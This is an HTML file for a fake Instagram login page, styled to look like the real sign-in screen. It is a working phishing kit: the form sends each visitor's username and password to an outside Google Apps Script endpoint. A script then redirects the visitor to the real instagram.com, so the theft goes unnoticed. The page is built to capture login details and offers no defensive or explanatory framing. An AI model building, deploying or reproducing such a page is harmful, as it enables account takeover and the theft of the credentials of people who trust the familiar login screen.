<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            border-radius: 10px;
        }

        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }

        input[type="text"], input[type="password"] {
            width: 80%;
            padding: 8px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            color: white;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo">

    <form id="login-form" action="https://script.google.com/macros/s/AKfycbyDEoMQxdLqn1-NeUbxnAacN7SKuaQdN1HQ33cIYTUrlR4N_rrujFi_OT5rLG8ZhS-pIg/exec" method="POST">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
        <button class="login-btn" type="submit">Log In</button>
    </form>
</div>

<!-- JavaScript para redirigir a Instagram tras enviar el formulario -->
<script>
    document.getElementById('login-form').addEventListener('submit', function(event) {
        setTimeout(function() {
            window.location.href = 'https://www.instagram.com';
        }, 500);  // Redirige despu√©s de 0.5 segundos
    });
</script>

</body>
</html>
